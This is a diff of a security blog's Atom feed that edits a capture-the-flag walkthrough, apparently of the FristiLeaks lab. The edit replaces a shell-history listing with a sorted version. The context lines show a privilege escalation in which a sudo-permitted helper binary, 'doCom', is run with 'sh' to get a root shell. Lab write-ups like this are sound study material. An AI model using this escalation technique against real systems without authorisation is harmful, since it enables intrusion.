@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-12-15T10:58:28+01:00</updated>
+  <updated>2015-12-15T11:32:25+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -516,68 +516,23 @@ and set suid permission using admin&rsquo;s account:</p>
 <span class='line-number'>34</span>
 <span class='line-number'>35</span>
 <span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat .bash_history
-</span><span class='line'>cat .bash_history
-</span><span class='line'>ls
-</span><span class='line'>pwd
-</span><span class='line'>ls -lah
-</span><span class='line'>cd .secret_admin_stuff/
-</span><span class='line'>ls
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ sort -u .bash_history
 </span><span class='line'>./doCom
 </span><span class='line'>./doCom test
-</span><span class='line'>sudo ls
-</span><span class='line'>exit
-</span><span class='line'>cd .secret_admin_stuff/
-</span><span class='line'>ls
-</span><span class='line'>./doCom
-</span><span class='line'>sudo -u fristi ./doCom ls /
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>exit
-</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>groups
-</span><span class='line'>ls -lah
-</span><span class='line'>usermod -G fristigod fristi
-</span><span class='line'>exit
-</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-</span><span class='line'>less /var/log/secure e
 </span><span class='line'>Fexit
+</span><span class='line'>cd .secret_admin_stuff/
 </span><span class='line'>exit
-</span><span class='line'>exit
+</span><span class='line'>groups
+</span><span class='line'>less /var/log/secure e
+</span><span class='line'>ls
+</span><span class='line'>ls -lah
+</span><span class='line'>pwd
+</span><span class='line'>sudo -u fristi ./doCom ls /
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+</span><span class='line'>sudo /var/fristigod/.secret_admin_stuff/doCom
+</span><span class='line'>sudo ls
+</span><span class='line'>usermod -G fristigod fristi
 </span><span class='line'>
 </span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
 </span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
@@ -593,6 +548,7 @@ and set suid permission using admin&rsquo;s account:</p>
 </span><span class='line'>
 </span><span class='line'>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
 </span><span class='line'>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
+</span><span class='line'>
 </span><span class='line'>sh-4.1# id
 </span><span class='line'>id
 </span><span class='line'>uid=0(root) gid=100(users) groups=100(users),502(fristigod)</span></code></pre></td></tr></table></div></figure>
